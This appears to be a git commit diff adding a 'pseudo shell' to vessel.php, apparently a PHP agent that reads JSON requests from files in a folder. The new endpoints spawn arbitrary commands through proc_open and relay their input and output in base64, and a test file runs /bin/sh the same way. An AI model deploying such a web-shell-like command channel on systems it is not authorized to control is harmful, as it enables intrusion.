b0fcafae15a82d2ac5c3bd6ed34473948934a8d5
Marven11 <110723864+Marven11@users.noreply.github.com>
2024-08-20 00:34:25 +0800

    psuedo shell for vessel

---
+++ test_environment/test_proc.php
@@ -0,0 +1,34 @@
+
+<?php
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
+);
+
+$cwd = '/tmp';
+$env = array('some_option' => 'aeiou');
+
+$process = proc_open('/bin/sh', $descriptorspec, $pipes, $cwd, $env);
+
+if (is_resource($process)) {
+    // $pipes now looks like this:
+    // 0 => writeable handle connected to child stdin
+    // 1 => readable handle connected to child stdout
+    // Any error output will be appended to /tmp/error-output.txt
+
+    fwrite($pipes[0], "echo 123;\n");
+    fflush($pipes[0]);
+    // fclose($pipes[0]);
+
+    fflush($pipes[1]);
+    var_dump(fread($pipes[1], 5));
+    fclose($pipes[1]);
+
+    // It is important that you close any pipes before calling
+    // proc_close in order to avoid a deadlock
+    $return_value = proc_close($process);
+
+    echo "command returned $return_value\n";
+}
+?>
--- test_environment/vessel.php
+++ test_environment/vessel.php
@@ -21,14 +21,75 @@ function version($args)
 }
 $endpoints["version"] = "version";
 
-function checkdir($args)
+$child_shells = [];
+
+function spawn_child_shell($args)
 {
-    return is_dir($args[0]) . "";
+    global $child_shells;
+    if (!function_exists("proc_open")) {
+        throw new Exception("Error: proc_open not exists");
+    }
+    $descriptorspec = array(
+        0 => array("pipe", "r"),
+        1 => array("pipe", "w"),
+        2 => array("pipe", "w")
+    );
+    $cwd = getcwd();
+    $env = array();
+    $proc = proc_open($args[0], $descriptorspec, $pipes, $cwd, $env);
+    if (!is_resource($proc)) {
+        throw new Exception("Error: spawn failed");
+    }
+    $child_shells[] = [
+        "proc" => $proc,
+        "pipes" => $pipes
+    ];
+    return key($child_shells);
 }
-$endpoints["checkdir"] = "checkdir";
+$endpoints["spawn_child_shell"] = "spawn_child_shell";
+
+function child_shell_write_stdin($args)
+{
+    global $child_shells;
+    $pipes = $child_shells[$args[0]]["pipes"];
+    $ret = fwrite($pipes[0], base64_decode($args[1]));
+    fflush($pipes[0]);
+    return $ret;
+}
+
+$endpoints["child_shell_write_stdin"] = "child_shell_write_stdin";
+
+function child_shell_read_stdout($args)
+{
+    global $child_shells;
+    $pipes = $child_shells[$args[0]]["pipes"];
+    return base64_encode(fread($pipes[1], $args[1]));
+}
+
+$endpoints["child_shell_read_stdout"] = "child_shell_read_stdout";
+
+function child_shell_close_pipe($args)
+{
+    global $child_shells;
+    $pipes = $child_shells[$args[0]]["pipes"];
+    fclose($pipes[$args[1]]);
+}
+$endpoints["child_shell_close_pipe"] = "child_shell_close_pipe";
 
 
+function child_shell_exit($args)
+{
+    global $child_shells;
+    $proc = $child_shells[$args[0]]["proc"];
+    $pipes = $child_shells[$args[0]]["pipes"];
+    unset($child_shells[$args[0]]);
+    fclose($pipes[0]);
+    fclose($pipes[1]);
+    fclose($pipes[2]);
+    return proc_close($proc);
+}
 
+$endpoints["child_shell_exit"] = "child_shell_exit";
 
 
 while (is_dir($folder . "/")) {
@@ -42,9 +103,23 @@ while (is_dir($folder . "/")) {
             $reqid = $matches[1];
             $content = file_get_contents($filepath);
             @unlink($filepath);
+            $data = null;
             try {
                 $data = json_decode($content);
+            } catch (Exception $e) {
+                continue;
+            }
+            $resp = null;
+            try {
                 $resp = $endpoints[$data->fn]($data->args);
+            } catch (Exception $e) {
+                file_put_contents("$folder/{$PREFIX}_{$reqid}_resp", json_encode([
+                    "reqid" => $reqid,
+                    "code" => -100,
+                    "msg" => $e->getMessage(),
+                ]));
+            }
+            try {
                 file_put_contents("$folder/{$PREFIX}_{$reqid}_resp", json_encode([
                     "reqid" => $reqid,
                     "code" => 0,
